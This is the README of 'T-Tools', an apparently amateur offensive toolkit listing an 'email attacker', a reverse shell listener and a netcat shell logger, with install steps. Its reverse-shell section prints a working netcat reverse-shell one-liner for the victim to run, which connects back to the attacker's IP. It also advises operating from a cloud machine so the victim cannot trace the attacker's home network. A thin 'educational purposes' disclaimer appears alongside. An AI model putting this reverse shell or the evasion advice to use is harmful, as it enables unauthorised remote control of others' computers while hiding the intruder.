# T-Tools-advanced--cyber-security


# What is T-Tools

T-Tools is an advanced cyber-security tools set.


# What does it includes

What does it include for cyber-security

An email attacker
A web scrapper
An advanced  reverse shell listener
An advanced netcat shell logger

What does it include for normal work

It includes 

A random password generator
simple phone number locator

# Installation

 this works for almost every operating system
 
 In your terminal type these commands
 
    $ sudo install git
    $ git clone https://github.com/Hirukshacoder/T-Tools-advanced--cyber-security/
    $ cd T-Tools-advanced--cyber-security
    $ pip install -r requirements.txt
    $ python3 main.py
           
# Reverse shells 
 
To use the listener change the ip in net.py and run it to start listening

Makesure you add your ip to the victim's command.

* Guidlines 

> Always use a cloud linux machine or another os in the cloud, because when the victim type the command he can grab your home network ip.

> And this tool is only for educational purposes.

    kali@attacker ~ $ python3 listen.py
    kali@victim ~ $ mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc <add your ip> 9999 >/tmp/f  
           
Made with 💖 by THB
